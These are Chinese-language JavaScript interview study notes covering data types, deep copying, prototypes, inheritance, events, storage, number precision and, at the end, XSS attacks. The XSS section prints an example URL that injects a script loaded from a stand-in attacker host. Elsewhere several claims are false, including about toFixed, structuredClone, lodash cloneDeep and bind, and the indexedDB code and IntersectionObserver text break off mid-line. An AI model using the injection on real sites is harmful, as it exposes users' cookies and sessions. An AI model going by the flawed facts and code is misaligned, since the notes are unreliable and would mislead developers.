# 1. JavaScript 数据类型

- 基本数据类型: 你可以直接获取到基本类型的值

  - Number
  - String
  - Boolean
  - Null
  - Undefined
  - Symbol

> 注意：
>
> - null 的 typeof instance === 'object'。
> - 基本类型的值本身是无法被改变的，对其操作会返回一个新的值。
> - runtime 时值存在与内存栈中

- 引用数据类型：引用类型赋值是获取到他的引用的值。
  - Object
    - Object
    - Array
    - Function

> 注意：
>
> - function 的 typeof instance === 'function'。
> - runtime 时引用地址存在于内存`栈`中，其实际值存在内存`堆`中。

# 2. JavaScript 中的类型转换机制

### Q1: 显示转换

- Number()
- parseInt()
- String()
- Boolean()

> Number() 与 parseInt() 的区别
>
> - Number 转换的时候是很严格的，只要有一个字符无法转成数值，整个字符串就会被转为 NaN
> - parseInt 相比 Number，就没那么严格了，parseInt 函数逐个解析字符，遇到不能转换的字符就停下来
>
> ```js
> Number("123abc"); // NaN
> parseInt("123abc"); // 123
> ```

### Q2: 隐式转换

#### 发生隐式转换的场景

- 字符串拼接
- 比较运算符(==, ===, >, <, >=, <=)、if、while 需要布尔值地方
- 算术运算（+, -, \*, /, %）

且要求运算符两边的值类型不同

#### 自动转换为布尔值

在需要

- undefined
- null
- false
- +0
- -0
- NaN
- ""（空字符串）

以上会转换为 false，其他的都会转换为 true

#### 自动转换为数字

- null 转为数值时，值为 0
- undefined 转为数值时，值为 NaN

# 3. 深拷贝和浅拷贝

深拷贝浅拷贝是针对引用类型的。

### Q1: 什么是浅拷贝和深拷贝

- 浅拷贝只进行一层复制，深层次的引用类型还是共享内存地址，原对象和拷贝对象还是会互相影响。
- 深拷贝是递归深层次拷贝，会在内存中开辟一个新的栈，两个对象指向不同的地址，且互不影响。

### Q2: 常用浅拷贝方法

- Object.assign()
- Array.prototype.concat()
- Array.prototype.slice()
- Array.prototype.from()
- 扩展运算符(...)

### Q3: 常用深拷贝方法及其优缺点

- JSON.parse(JSON.stringify())
  > 缺点: 无法拷贝函数、正则、循环引用、会忽略 undefined
- lodash 的深拷贝方法 \_.cloneDeep()
  > 缺点: 无法拷贝函数、正则、循环引用
  > 优点: 可以拷贝 undefined
- 手写递归深拷贝

  ```js
  function deepClone(target, hash = new WeakMap()) {
    // 额外开辟一个存储空间WeakMap来存储当前对象
    if (target === null) return target; // 如果是 null 就不进行拷贝操作
    if (target instanceof Date) return new Date(target); // 处理日期
    if (target instanceof RegExp) return new RegExp(target); // 处理正则
    if (target instanceof HTMLElement) return target; // 处理 DOM元素

    if (typeof target !== "object") return target; // 处理原始类型和函数 不需要深拷贝，直接返回

    // 是引用类型的话就要进行深拷贝
    if (hash.get(target)) return hash.get(target); // 当需要拷贝当前对象时，先去存储空间中找，如果有的话直接返回
    const cloneTarget = new target.constructor(); // 创建一个新的克隆对象或克隆数组
    hash.set(target, cloneTarget); // 如果存储空间中没有就存进 hash 里

    Reflect.ownKeys(target).forEach((key) => {
      // 引入 Reflect.ownKeys，处理 Symbol 作为键名的情况
      cloneTarget[key] = deepClone(target[key], hash); // 递归拷贝每一层
    });
    return cloneTarget; // 返回克隆的对象
  }
  ```

  以上手写深拷贝方法可以实现

  - 支持对象、数组、日期、正则的拷贝。
  - 处理原始类型（原始类型直接返回，只有引用类型才有深拷贝这个概念）。
  - 处理 Symbol 作为键名的情况。
  - 处理函数（函数直接返回，拷贝函数没有意义，两个对象使用内存中同一个地址的函数，问题不大）。
  - 处理 DOM 元素（DOM 元素直接返回，拷贝 DOM 元素没有意义，都是指向页面中同一个）。
  - 额外开辟一个储存空间 WeakMap，解决循环引用递归爆栈问题（引入 WeakMap 的另一个意义，配合垃圾回收机制，防止内存泄漏）。

- immutable.js
  > 优点: 永久不变的数据结构，可以很方便的实现深拷贝
  > 缺点: 学习成本高，需要安装 immutable.js 库
- structuredClone
  > 优点: 可以拷贝函数、正则、循环引用、可以拷贝 undefined
  > 缺点: 只能在浏览器中使用

# 4. 闭包

[参考](https://github.com/yangin/blog/blob/main/%E9%97%AD%E5%8C%85.md)

# 5. 对作用域链的理解

### Javascript 中的作用域

- 全局作用域
- 函数作用域
- 块级作用域

### 作用域链

作用域链表示的是变量的自下向上链式查找的方式，即当访问一个变量时，会先从当前作用域查找，如果没有找到，就会从父级作用域查找，直到找到该变量的声明或者到达全局作用域，如果还没有找到，就会报错。

# 6. JavaScript 原型，原型链 ? 有什么特点？

### Q1: 什么是原型

原型是 Javascript Object 中的一个概念

在 Javascript 中每个对象都是继承自一个`父级模板对象`，从父级中继承方法和属性，这个父级模板对象，我们称做原型。可以将原型理解为 Class 继承关系中的父类。

> 举个例子：
>
> ```js
> const Person = {};
> ```
>
> - Person 是一个对象, 它继承自原型 Object
>
> - Object 自身拥有一些属性和方法，比如 toString()，valueOf()等, 则在 Person 中也可以使用这些方法。
>
> - Object 向上继承自原型 null，null 没有原型，是原型链的最顶端。

### Q2: 创建一个 Object 的本质

这里的声明 Object 包括声明一个对象、声明一个函数、声明一个数组等。

```js
// 声明一个对象
const obj = {};
// 其本质是
const obj = new Object();

// 声明一个函数
function fn() {}
// 其本质是
const fn = new Function();

// 声明一个数组
const arr = [];
// 其本质是
const arr = new Array();
```

通过 new 关键字调用相应的构造函数（Object，Function,Array），创建一个新的对象，这个对象会继承构造函数的属性和方法。

### Q3：理解 construct, prototype 和`__proto__`

[参考](https://juejin.cn/post/6844903837623386126)

在 Javascript 中，每个对象都会有一个内置属性`prototype`（原型），在浏览器中显示为`[[Prototype]]`, 表示一个隐藏属性。

**场景一**

在 Javascript 中，每个对象都是由一个构造函数创建的，被创建的对象，我们叫做构造函数的实例。

```js
function Person(name) {
  this.name = name;
}

const person1 = new Person("haha");
const person2 = new Person("hehe");
```

上述例子中，Person 是 person1, person2 的构造函数，person1, person2 是 Person 的实例。

在实例中，通常通过`construct`来获取自己的构造函数。

```js
console.log(person1.constructor); // Person(){}
```

> **总结：** 实例通过 `constructor` 属性可以访问到创建该对象的`构造函数`。

**场景二**

此时需要为 person1,person2 2 个实例添加一个相同的方法 getName()

常规做法是：

```js
person1.getName = function () {
  return this.name;
};

person2.getName = function () {
  return this.name;
};
```

显然，当实例很多时，这种做法会导致书写冗余，且每个实例都要创建一份相同的方法，造成不必要的内存消耗。

于是，我们可以将这个方法放在构造函数的原型对象上，这样所有实例都可以共享这个方法。

```js
function Person(name) {
  this.name = name;
}

Person.prototype.getName = function () {
  return this.name;
};

const person1 = new Person("haha");
const person2 = new Person("hehe");

console.log(person1.getName()); // haha
console.log(person2.getName()); // hehe
```

那么构造函数 Person 的 prototype 的作用就是用来存放同一类型实例的共享属性和方法。

> **总结：**
>
> - `prototype`即实例的原型对象， 用于存放同一类型实例的共享属性和方法。
>
> - 实例的`原型对象`，即该实例的构造函数的 prototype 属性。

因为同一个构造函数的每个实例都有一个 `construct` 属性用来指向当前的构造函数，为了节省内存，`construct` 实际上是被当做共享属性放在它们的原型对象中了，即存储在`构造函数.prototype` 中。

```js
Person.prototype.constructor === Person;
```

> **总结：**
>
> - 默认 constructor 实际上是被当做共享属性放在它们的原型对象中。
>
> - 构造函数的 prototype.constructor 指向构造函数本身

实例的 person1.prototype 指的啥？

**场景三**

修改实例的 constructor 属性

```js
function Person(name) {
  this.name = name;
}

const person1 = new Person("haha");
const person2 = new Person("hehe");

person1.constructor = Array;
console.log(person1.constructor); // Array(){}
console.log(person2.constructor); // Person(){}
```

如上，当修改实例的 constructor 属性后，无法再通过`实例.constructor`获取到构造函数了。

于是，我们需要一个属性来稳定的指向自己的原型对象，这个属性就是`__proto__`。

> **总结：**
>
> - `实例.__proto__ === 构造函数.prototype`
> - `实例.__proto__.construct === 构造函数.prototype.construct === 构造函数`
> - 每个对象都有一个`__proto__`属性，指向创建该对象的构造函数的原型对象。

### 总结

- constructor
  > 作用：指向实例对象的构造函数
  >
  > 特点：
  >
  > - 易被更改，不可靠
  > - 实例对象本身没有该属性（藏在自身的原型对象中，prototype 对象除外）
- prototype
  > 含义：对象实例的原型对象
  >
  > 作用：
  >
  > - 存放共享属性和共享方法
  > - 本质是为了节省内存
  >
  > 特点：
  >
  > - 仅函数拥有(函数声明时同时创建)
  > - 是 Object 函数的实例
- `__proto__`
  > 作用：
  >
  > - 指向自己的原型对象
  > - 构成原型链的关键
  >
  > 特点：
  >
  > - 每个对象都有
  > - 待寻属性对象自身不存在时，通过该属性沿着原型链向上查找

### Q4: 什么是原型链

对象继承自原型，原型继承自另外一个原型，这种层层继承的关系就是原型链。

访问对象的属性时，就是沿着原型链自下向上查找的。

> 即会先在对象自身属性中查找，如果没有找到，就会去原型中查找，如果还没有找到，就会去原型的原型中查找，直到找到该属性的声明或者到达原型链的顶端，如果还没有找到，就会返回 undefined。

### Q5: 原型链的特点

- 原型链的顶端是 null，null 没有原型，也没有原型链。
- 所有的函数都是 Function 的实例，因此它们都继承自 Function.prototype。
- 所有的对象都是 Object 的实例，因此它们都继承自 Object.prototype。

# 7. 说说构造函数及 new

### 函数分类

- 普通函数
- 构造函数
- 箭头函数
- 生成器函数
- 异步函数
- 立即执行函数
- 递归函数
- 高阶函数
- 纯函数
- 柯里化函数
- 惰性函数
- 回调函数
- 闭包函数
- 等等

### Q1: 什么是构造函数

构造函数是一种特殊的函数，配合 new 用来创建新对象。作为新创造对象的原型。

#### 构造函数与普通函数的区别

- 构造函数通过 new 关键字调用，普通函数直接调用。
- 构造函数内部的 this 指向新创建的对象实例，普通函数内部的 this 指向调用它的对象。
- 构造函数内部不需要 return 语句，除非要返回其他对象，普通函数需要 return 语句。
- 构造函数首字母通常大写，普通函数首字母通常小写。

```js
function Person(name) {
  this.name = name;
}

const person = new Person("haha");
console.log(person.name); // haha
```

### Q2: new 的过程

- 创建一个空的简单 JavaScript 对象（即 {}）；
- 为步骤 1 新创建的对象添加属性 `__proto__`，将该属性链接至构造函数的原型对象；
- 将步骤 1 新创建的对象作为 this 的上下文；
- 如果该函数没有返回对象，则返回 this。

### Q3: 手写 new

```js
function myNew(fn, ...args) {
  const obj = Object.create(fn.prototype);
  const result = fn.apply(obj, args);
  return result instanceof Object ? result : obj;
}

function Person(name) {
  this.name = name;
}

const person = myNew(Person, "haha");
console.log(person.name); // haha
```

# 8. JavaScript 继承的 6 种实现方式

- 原型链继承

  > 通过将父类的实例作为子类的原型，实现子类对父类的继承。

  ```js
  function Parent() {
    this.name = "parent";
  }
  Parent.prototype.getName = function () {
    return this.name;
  };
  function Child() {}
  Child.prototype = new Parent(); // 核心：父类的实例作为子类的原型对象
  Child.prototype.constructor = Child;
  const child = new Child();
  console.log(child.getName()); // parent
  // 在这里Child是child的原型，Parent是Child的原型，所以child可以访问Parent的属性和方法
  ```

  > 优点：
  >
  > - 易于实现,一行代码就能实现
  >
  > 缺点：
  >
  > - 无法实现多继承。
  > - 无法向父类构造函数传参。
  > - 所有子类实例都会共享父类实例的属性（子类实例的修改会影响到所有子类实例）。

- 构造函数继承

  > 通过 call 或 apply，在子类的构造函数中调用父类的构造函数。

  ```js
  function Parent() {
    this.name = "parent";
  }
  Parent.prototype.getName = function () {
    return this.name;
  };
  function Child() {
    Parent.call(this); // 核心：在子类构造函数中调用父类构造函数
  }
  const child = new Child();
  console.log(child.getName()); // parent
  ```

  > 优点：
  >
  > - 解决了子类实例共享父类引用属性的问题
  > - 创建子类实例时可以向父类传递参数
  > - 可以实现多继承（call 多个父类对象）
  >
  > 缺点：
  >
  > - 无法继承父类原型中的方法,除非父类的方法写入构造函数中,但这样就实现不了函数的复用

- 组合继承

  > 将原型链继承和构造函数继承组合起来使用。

  ```js
  function Parent() {
    this.name = "parent";
  }
  Parent.prototype.getName = function () {
    return this.name;
  };
  function Child() {
    Parent.call(this);
  }
  Child.prototype = new Parent();
  Child.prototype.constructor = Child;
  const child = new Child();
  console.log(child.getName()); // parent
  ```

  > 优点：
  >
  > - 不存在引用属性共享问题(不同子类实例之间不会互相影响)
  > - 可以向父类传递参数
  > - 函数可复用
  >
  > 缺点：
  >
  > - 子类原型上有一份多余的父类实例属性，因为父类构造函数被调用了两次，生成了两份，而子类实例上的那一份屏蔽了子类原型上的,造成内存浪费

- 原型式继承

  > 借助原型可以基于已有的对象创建新对象，同时还不必创建自定义类型。

  ```js
  function createObj(o) {
    function F() {}
    F.prototype = o;
    return new F();
  }
  const person = {
    name: "haha",
    getName: function () {
      return this.name;
    },
  };
  const child = createObj(person);
  console.log(child.getName()); // haha
  ```

  > 优点：
  >
  > - 可以在不必预先定义构造函数的情况下实现继承
  > - 可以实现多继承
  >
  > 缺点：
  >
  > - 无法实现复用
  > - 子类实例共享父类引用属性

- 寄生式继承

  > 在原型式继承的基础上，增强对象，返回构造函数。

  ```js
  function createObj(o) {
    function F() {}
    F.prototype = o;
    return new F();
  }
  function createChild(o) {
    const clone = createObj(o);
    clone.getName = function () {
      return this.name;
    };
    return clone;
  }
  const person = {
    name: "haha",
  };
  const child = createChild(person);
  console.log(child.getName()); // haha
  ```

  > 优点：
  >
  > - 可以在不必预先定义构造函数的情况下实现继承
  > - 可以实现多继承
  >
  > 缺点：
  >
  > - 无法实现复用
  > - 子类实例共享父类引用属性

- 寄生组合式继承

  > 在组合继承的基础上，将父类的实例作为子类的原型。

  ```js
  function Parent() {
    this.name = "parent";
  }
  Parent.prototype.getName = function () {
    return this.name;
  };
  function Child() {
    Parent.call(this);
  }
  Child.prototype = Object.create(Parent.prototype);
  Child.prototype.constructor = Child;
  const child = new Child();
  console.log(child.getName()); // parent
  ```

  > 优点：
  >
  > - 可以向父类传递参数
  > - 函数可复用
  > - 实例之间不会相互影响
  > - 多继承
  >
  > 缺点：
  >
  > - 无

# 9. this 的指向

[参考](https://github.com/yangin/blog/blob/main/this%E7%9A%84%E6%8C%87%E5%90%91.md)

# 10. Javascript 中的执行上下文

[参考](https://github.com/yangin/blog/blob/main/Javascript%E5%9F%BA%E7%A1%80.md#%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87context)

# 11. 事件循环

[参考](https://github.com/yangin/blog/blob/main/EventLoop.md)

# 12. typeof 与 instanceof 区别

### Q1: typeof

typeof 操作符返回一个字符串，表示操作数的类型。

```js
typeof operand;
```

具体例子

```js
typeof 123; // number
typeof "123"; // string
typeof true; // boolean
typeof undefined; // undefined
typeof null; // object
typeof Symbol(); // symbol
typeof {}; // object
typeof []; // object
typeof function () {}; // function
```

### Q2: instanceof

instanceof 运算符用来检测构造函数的 prototype 属性是否存在于实例对象的原型链上。

```js
object instanceof constructor;
```

具体例子

```js
function Person() {}
const person = new Person();
console.log(person instanceof Person); // true
```

### Q3: typeof 与 instanceof 的区别

typeof 与 instanceof 都是判断数据类型的方法

区别：

- typeof 用来检测`基本数据类型`，instanceof 用来检测`引用数据类型`。
- typeof 返回一个变量的基本类型，是字符串，instanceof 返回一布尔值。

# 13. Javascript 中的事件模型

### Q1: 事件模型

- 原生事件模型

  定义：事件通过元素属性直接绑定在 DOM 元素上。

  html 绑定方式

  ```html
  <button onclick="fun()">click me</button>
  ```

  js 绑定方式

  ```js
  const btn = document.querySelector("button");
  btn.onclick = fun;
  ```

  特点：

  - 绑定速度快
  - 事件只能绑定一个处理函数。
  - 只在冒泡阶段触发。

- 标准事件模型

  定义：事件通过 addEventListener 绑定在 DOM 元素上。

  ```js
  const btn = document.querySelector("button");
  btn.addEventListener("click", fun);
  ```

  特点：

  - 事件可以绑定多个处理函数。

- IE 事件模型

  定义：事件通过 attachEvent 绑定在 DOM 元素上。

  ```js
  const btn = document.querySelector("button");
  btn.attachEvent("onclick", fun);
  ```

### Q2: 事件流

事件流描述的是从页面中接收并处理事件的顺序。主要用来处理父子、祖先元素的事件冲突问题。

- 事件捕获阶段
  > 事件从最外层的祖先元素开始，一层一层向下传递，直到传递到目标元素。依次检查经过的节点是否绑定了事件监听函数，如果有则执行。
- 事件处理阶段
  > 事件传递到目标元素，触发目标元素的原生函数及监听函数，且`原生函数早于监听函数执行`。
- 事件冒泡阶段
  > 事件从目标元素开始，一层一层向上冒泡，直到传递到最外层的祖先元素。依次检查经过的节点是否绑定了事件监听函数，如果有则执行。

> - 原生事件模型只支持事件冒泡。
>
> - 标准事件模型支持事件捕获和事件冒泡，根据 addEventListener 的第三个参数来决定是事件捕获还是事件冒泡时执行，默认事件冒泡。
>
> - IE 事件模型只支持事件冒泡。

> 注意：
>
> 同一元素上同时存在原生模型事件与标准模型事件时，且在同一事件流阶段执行（如冒泡阶段），原生模型事件早于标准模型事件执行。

例子：

```html
<div id="level1" class="container" onclick="handle1()">
  <div id="level2" class="wrap" onclick="handle2()">
    <p id="level3" class="btn" onclick="handle3()">Click Me</p>
  </div>
</div>
<script>
  const handle1 = () => {
    console.log("bind1");
  };

  const handle2 = () => {
    console.log("bind2");
  };

  const handle3 = () => {
    console.log("bind3");
  };

  const el1 = document.getElementById("level1");
  el1.addEventListener("click", () => {
    console.log("listener1");
  });

  const el2 = document.getElementById("level2");
  el2.addEventListener(
    "click",
    () => {
      console.log("listener2");
    },
    true
  );

  const el3 = document.getElementById("level3");
  el3.addEventListener("click", () => {
    console.log("listener3");
  });
</script>
```

执行结果：

```js
listener2;
bind3;
listener3;
bind2;
bind1;
listener1;
```

### Q3: 阻止事件冒泡

event.`stopPropagation()`;

### Q4: 事件委托

事件委托是利用事件冒泡原理，将事件绑定在父元素上，通过判断事件源来执行相应的处理函数。

优点：

- 减少内存消耗，提高性能。
- 动态绑定，减少重复工作

局限性：

- focus、blur 这些事件没有事件冒泡机制，所以无法进行委托绑定事件
- mousemove、mouseout 这样的事件，虽然有事件冒泡，但是只能不断通过位置去计算定位，对性能消耗高，因此也是不适合于事件委托的

# 14. bind、call、apply 的区别

bind, call, apply 都是用来改变函数执行上下文的，即改变函数内部 this 的指向。

- apply

  - 第一个参数是新的 this 指向，当为 null 或 undefined 时，默认指向 window
  - 第二个参数是原函数接受的参数，以数组形式传入

    ```js
    function fn(a, b) {
      console.log(this, a, b);
    }
    fn.apply({ name: "haha" }, [1, 2]); // {name: "haha"} 1 2
    ```

  - 是立即执行函数

- call

  - 第一个参数是新的 this 指向，当为 null 或 undefined 时，默认指向 window
  - 后续的传参组成是一个参数列表，作为原函数的参数传入

    ```js
    function fn(a, b) {
      console.log(this, a, b);
    }
    fn.call({ name: "haha" }, 1, 2); // {name: "haha"} 1 2
    ```

  - 是立即执行函数

- bind

  - 只接受一个参数，是新的 this 指向，当为 null 或 undefined 时，默认指向 window
  - bind 会返回绑定 this 之后的函数，需要手动调用

    ```js
    function fn(a, b) {
      console.log(this, a, b);
    }
    const newFn = fn.bind({ name: "haha" });
    newFn(1, 2); // {name: "haha"} 1 2
    ```

# 15. Array 与 Object 常用的方法

### Q1: Array 常用方法

- 实例方法

  - Array.prototype.`map()`
  - Array.prototype.`filter()`
  - Array.prototype.`forEach()`
  - Array.prototype.`reduce()`
  - Array.prototype.`some()`
  - Array.prototype.`every()`
  - Array.prototype.`find()`
  - Array.prototype.`findIndex()`
  - Array.prototype.`includes()`
  - Array.prototype.`indexOf()`
  - Array.prototype.`lastIndexOf()`
  - Array.prototype.`concat()`
  - Array.prototype.`slice()`
  - Array.prototype.`splice()`
  - Array.prototype.`join()`
  - Array.prototype.`reverse()`
  - Array.prototype.`sort()`
  - Array.prototype.`push()`
  - Array.prototype.`pop()`
  - Array.prototype.`shift()`
  - Array.prototype.`unshift()`
  - Array.prototype.`fill()`
  - Array.prototype.`flat()`
  - Array.prototype.`flatMap()`

- 静态方法

  - Array.`isArray()`
  - Array.`from()`

### Q2: Object 常用方法

- 静态方法
  - Object.`assign()`
  - Object.`create()`
  - Object.`keys()`
  - Object.`values()`
  - Object.`entries()`

# 16. Javascript 中内存泄露的几种情况

内存泄漏（Memory leak）是在计算机科学中，由于疏忽或错误造成程序未能释放已经不再使用的内存

### Q1: 垃圾回收机制（Garbage Collecation）

原理：垃圾收集器会定期（周期性）找出那些不在继续使用的变量，然后释放其内存

常用的两种算法：

- 标记清除算法(常用)
  > 原理：分为标记和清除两个阶段，首先标记出所有需要回收的对象，在标记完成后统一回收所有被标记的对象。
  >
  > 缺点：回收后会造成内存碎片化。
- 引用计数算法
  > 原理：设置引用数，判断当前引用数是否为 0，为 0 则回收。
  >
  > 缺点：无法回收循环引用的对象。

### Q2: 内存泄漏的几种情况

- 全局变量

  全局变量会一直存在于内存中，直到页面关闭，如果不需要使用的变量，应该及时销毁。

  解决办法：

  - 使用 let、const 声明变量，避免变量提升。

- 定时器

  定时器会导致回调函数中的变量无法被回收。

  解决办法：

  - 使用 clearTimeout() 清除定时器。

- 事件监听

  事件监听会导致回调函数中的变量无法被回收。

  解决办法：

  - 使用 removeEventListener() 移除事件监听。

- 闭包

  闭包会导致父级作用域中的变量无法被回收。

  解决办法：

  - 尽量避免使用闭包。

- DOM 引用

  DOM 引用会导致 DOM 元素无法被回收。

  解决办法：

  - 将 DOM 元素置为 null。

# 17. Javascript 中本地存储的方式有哪些，区别及应用场景

- cookies

  一般用于存储少量数据，如用户登录信息，在请求接口时自动携带到服务器。

  **特点**

  - 与服务器通信时会自动携带，不需要手动设置
  - 有过期时间，可以设置长期有效(Expires、Max-Age)
  - 有域名限制，可以防止其他网站访问(Domain、Path)
  - 有大小限制，一般为 4kb
  - 会影响性能，每次请求都会携带
  - 只能存储字符串

  **使用**

  - Expires：设置过期时间，GMT 格式，如：Thu, 01 Jan 1970 00:00:00 GMT
  - Max-Age：设置过期时间，单位为秒，如：3600
  - Domain: 指定了 Cookie 可以送达的主机名
  - Path: 指定了主机下的哪些路径可以接受 Cookie
  - Secure: 指定了 Web 页面上的 Cookie 是否仅通过加密的安全通道(HTTPS)进行传输

  ```js
  document.cookie = "name=; expires=Thu, 01 Jan 2023 00:00:00 GMT";
  ```

  **删除 cookies**

  设置过期时间为过去的时间即可

- sessionStorage

  一般用于存储临时数据，如表单数据，敏感账号一次性登录等，页面关闭后自动销毁。

  **特点**

  - 仅在当前会话下有效，关闭页面或浏览器后被清除
  - 仅在当前页面有效，如果两个页面同源，但是不同页面之间的 sessionStorage 数据不共享
  - 只能存储字符串

  **使用**

  ```js
  sessionStorage.setItem("name", "haha");
  sessionStorage.getItem("name"); // haha
  sessionStorage.removeItem("name");
  sessionStorage.clear();
  ```

- localStorage

  一般用于存储长期有效的数据，如用户操作信息（token）等，除非手动清除，否则永久保存。

  **特点**

  - 除非手动清除，否则永久保存
  - 仅在当前域名下有效，不同域名之间的 localStorage 数据不共享
  - 只能存储字符串
  - 大小限制为 5M（跟浏览器厂商有关）
  - 当本页操作（新增、修改、删除）了 localStorage 的时候，本页面不会触发 storage 事件,但是别的页面会触发 storage 事件

  **使用**

  ```js
  localStorage.setItem("name", "haha");
  localStorage.getItem("name"); // haha
  localStorage.removeItem("name");
  localStorage.clear();
  ```

- indexDB

  一般用于存储大量数据，如图片、视频、在线文档等，除非手动清除，否则永久保存。

  **特点**

  - 除非手动清除，否则永久保存
  - 储存量理论上没有上限
  - 所有操作都是异步的，相比 LocalStorage 同步操作性能更高，尤其是数据量较大时
  - 支持储存 JS 的原生对象
  - 是个正经的数据库，意味着数据库能干的事它都能干

  **使用**

  ```js
  const request = window.indexedDB.open("MyTestDatabase", 3);
  request.onerror = function (event) {
    // 错误处理
  };
  request.onupgradeneeded = function (event) {
    const db = event.target.result;
    const objectStore = db.createObjectStore("customers", { keyPath: "id" });
    objectStore.createIndex("name", "name", { unique: false });
    objectStore.createIndex("email", "email", { unique: true });
  };
  request.onsuccess = function (event) {
    const db = event.target.result;
    const transaction = db.transaction(["customers"], "readwrite");
    const objectStore = transaction.objectStore("customers");
    const request = objectStore.add({ id: 1, name: "haha", email: "
  ```

  **第三方库**

  - [localForage](https://github.com/localForage/localForage)

# 18. Javascript 数字精度丢失问题

经典问题：

```js
0.1 + 0.2 === 0.3; // false
```

### Q1: 为什么会出现这种情况

因为计算机中的数字都是以二进制存储的，而二进制无法精确表示十进制的 0.1 和 0.2，所以会出现精度丢失的问题。

### Q2: 如何解决

- 显示指定精度

  利用 toFixed() 方法，用四舍五入法达到指定精度。

  ```js
  (0.1 + 0.2).toFixed(1) === 0.3; // true
  ```

- 加减乘除运算

  把小数转成整数再运算，最后再转回小数。

  ```js
  // 精确加法
  function add(a, b) {
    const aDigits = (a.toString().split(".")[1] || "").length;
    const bDigits = (b.toString().split(".")[1] || "").length;
    const baseNum = Math.pow(10, Math.max(aDigits, bDigits));
    return (a * baseNum + b * baseNum) / baseNum;
  }
  ```

# 19. 如何判断一个元素是否在可视区域

### 需求场景

- 图片懒加载
- 列表的无线滚动
- 计算广告元素的曝光情况
- 可点击链接的预加载

### Q1: 如何判断一个元素是否在可视区域

- offsetTop、scrollTop

  offsetTop：元素顶部到父元素顶部的距离。

  scrollTop：元素顶部到可视区域顶部的距离。

  ```js
  const el = document.querySelector("#el");
  const top = el.offsetTop;
  const scrollTop = document.documentElement.scrollTop;
  const windowHeight = document.documentElement.clientHeight;
  if (top < scrollTop + windowHeight) {
    // 在可视区域
  }
  ```

- getBoundingClientRect()

  返回元素的大小及其相对于视口的位置。

  返回值是一个 DOMRect 对象，包含了 top、left、right、bottom、width、height 等属性。

  ```js
  const rect = el.getBoundingClientRect();
  const top = rect.top;
  const bottom = rect.bottom;
  const left = rect.left;
  const right = rect.right;
  ```

  当页面发生滚动的时候，top 与 left 属性值都会随之改变

  如果一个元素在视窗之内的话，那么它一定满足下面四个条件：

  - top >= 0
  - left >= 0
  - bottom <= 视窗高度
  - right <= 视窗宽度

- IntersectionObserver

  IntersectionObserver API 提供了一种异步观察目标元素与其祖先元素或顶级文档视窗(viewport)交叉状态的方法。

  ```js
  const observer = new IntersectionObserver(callback, options);
  observer.observe(el);
  ```

  > - callback：当被观察元素的可见性变化时，会调用该回调函数。
  > - options：配置项，包含 root、rootMargin、threshold 等属性。
  >   - root：根元素，如果没有指定或者为 null，则使用浏览器视窗作为根元素。
  >   - rootMargin：根元素的 margin，用来扩展或缩小 root 的边界。
  >   - threshold：一个数组，包含一个或多个数字，表示交叉比例的阈值，即当被观察元素的交叉比例达到阈值时，会调用回调函数。

  IntersectionObserverEntry 对象包含了与 IntersectionObserver 相关的信息，包括：

  - boundingClientRect：目标元素的矩形信息。
  - intersectionRatio：目标元素与根元素的交叉比例。
  - intersectionRect：目标元素与根元素的交叉区域的矩形信。
  - isIntersecting：目标元素是否与根元素相交。
  - rootBounds：根元素的矩形信息。
  - target：被观察的目标元素。
  - time：可见性发生变化的时间。

  IntersectionObserverEntry 对象的 intersectionRatio 属性表示目标元素与根元素的交叉比例，即目标元素的面积与根元素的面积的比值。

  - 当目标元素完全在根元素内时，交叉比例为 1。
  - 当目标元素完全

# 20. 防抖与节流

[参考](https://github.com/yangin/blog/blob/main/Javascript%E5%9F%BA%E7%A1%80.md#%E9%98%B2%E6%8A%96%E5%87%BD%E6%95%B0--%E8%8A%82%E6%B5%81%E5%87%BD%E6%95%B0)

# 21. 函数编程

[参考](https://vue3js.cn/interview/JavaScript/functional_programming.html)

- 纯函数
- 高阶函数
- 柯里化
- 组合与管道

  组合：compose 执行是从右到左的

  ```js
  const compose =
    (...fns) =>
    (val) =>
      fns.reverse().reduce((acc, fn) => fn(acc), val);
  ```

  管道:pipe 执行顺序是从左到右执行的

  ```js
  const pipe =
    (...fns) =>
    (val) =>
      fns.reduce((acc, fn) => fn(acc), val);
  ```

# 22. Web 常见的攻击方式及防御

常见的攻击方式

- XSS (Cross Site Scripting) 跨站脚本攻击
- CSRF (Cross Site Request Forgery) 跨站请求伪造
- SQL 注入攻击

### Q1: XSS 攻击

XSS (Cross Site Scripting) 攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。

- 持久型 XSS

  持久型 XSS 攻击，是指将用户输入的数据存储在服务器端（如数据库中），当浏览器请求数据时，服务器端将存储的数据“反射”给浏览器，通过浏览器执行恶意脚本，从而达到攻击的目的。

  场景：

  常见于带有`用户保存数据的网站功能`，如`论坛发帖`、`商品评论`、`用户私信`等

  攻击过程：

  - 攻击者在发帖网站上一篇热门文章下进行评论，并在评论中注入恶意脚本
  - 携带恶意脚本的评论会被存储在到服务端（如数据库中）
  - 当其他用户浏览该文章时，恶意脚本被服务器返回（评论随文章一同被加载）
  - 浏览器执行恶意脚本，从而达到攻击的目的

  > 恶意脚本内容包括：
  >
  > - 获取用户 cookie，localStorage 等用户敏感信息，然后发送给攻击者的服务器
  > - 或冒充用户发送请求

- 反射型 XSS

  反射型 XSS 攻击，发生在当传递给服务器的用户数据被立即返回并在浏览器中原样显示的时候。

  场景：

  常见于`通过 URL 传递参数的功能`，如`网站搜索`、`跳转链接`等

  例如：`http://mysite.com?q=beer<script%20src="http://evilsite.com/tricky.js"></script>`;

  攻击过程(如跳转链接+网站搜索)：

  - 攻击者构造出特殊的 URL，其中包含恶意代码， 例如：`http://mysite.com?q=beer<script%20src="http://evilsite.com/tricky.js"></script>`;
  - 攻击者通过诱导用户点击特殊的 URL，例如：通过邮件、社交网络等方式，诱导用户点击特殊的 URL
  - 用户打开了恶意链接，浏览器请求了特殊的 url，服务器解析后，将`<script src="http://evilsite.com/tricky.js"></script>`返回给浏览器
  - 浏览器解析恶意代码并执行，从而达到攻击的目的

  > 这里需要注意的是，反射型 XSS 攻击，需要用户`主动打开恶意链接`，才能达到攻击的目的

  > 恶意脚本内容包括：
  >
  > - 构造的第三方网站 url 为正规的网站（如淘宝搜索指定产品），所以被攻击者是可以正常打开并显示的
  > - 利用浏览器默认记录了用户的登录状态，所以攻击者可以通过恶意脚本获取到用户当前网站的 cookie 等信息, 然后发送回攻击者自己的服务器
  > - 或冒充用户发送请求

**防御**

- 对用户输入的数据进行过滤和转义
